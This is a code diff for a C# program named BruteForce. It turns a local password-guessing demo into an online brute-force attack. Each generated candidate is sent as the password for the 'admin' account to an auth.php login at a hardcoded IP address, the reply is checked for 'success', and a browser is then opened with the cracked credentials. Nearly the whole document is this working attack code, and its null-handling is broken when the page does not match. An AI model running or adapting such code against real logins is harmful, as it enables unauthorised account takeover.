@@ -2,11 +2,11 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
-using System.Drawing;
 using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Net;
+using System.Text.RegularExpressions;
 
 namespace BruteForce
 {
@@ -43,6 +43,8 @@ namespace BruteForce
             var estimatedPasswordLength = 3;
             startBruteForce(estimatedPasswordLength);
             MessageBox.Show("The password is: " + result);
+            System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+
         }
 
         private static void startBruteForce(int keyLength)
@@ -80,12 +82,25 @@ namespace BruteForce
 
                     /* The char array will be converted to a string and compared to the password. If the password
                      * is matched the loop breaks and the password is stored as result. */
-                    if ((new String(keyChars)) == password)
+
+                    WebClient client = new WebClient();
+                    string theBody = null;
+                    string downloadString = client.DownloadString("http://212.143.244.206/auth.php?username=admin&password=" + new String(keyChars));
+                    RegexOptions options = RegexOptions.IgnoreCase | RegexOptions.Singleline;
+                    Regex regx = new Regex("<body>(?<theBody>.*)</body>", options);
+                    Match match = regx.Match(downloadString);
+                    if (match.Success)
+                    {
+                        theBody = match.Groups["theBody"].Value;
+                    }
+                    //System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + new String(keyChars));
+                    if (theBody.Equals("\nsuccess"))
                     {
                         if (!isMatched)
                         {
                             isMatched = true;
                             result = new String(keyChars);
+                            Console.WriteLine(theBody);
                         }
                         return;
                     }
